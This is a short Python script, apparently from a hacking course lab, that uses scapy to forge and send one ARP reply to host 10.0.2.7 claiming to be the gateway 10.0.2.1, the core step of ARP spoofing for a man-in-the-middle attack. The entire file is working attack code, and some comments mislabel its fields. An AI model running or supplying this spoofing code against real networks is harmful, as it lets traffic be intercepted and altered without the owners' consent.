#!/usr/bin/env python

import scapy.all as scapy

packet = scapy.ARP(op=2,  pdst="10.0.2.7", hwdst="08:00:27:0b:40:3a",
                   psrc="10.0.2.1")  # we wait a response  so we use 2
# pdst = target ip address   hwdst = own mac address   psrc= gateway

scapy.send(packet)
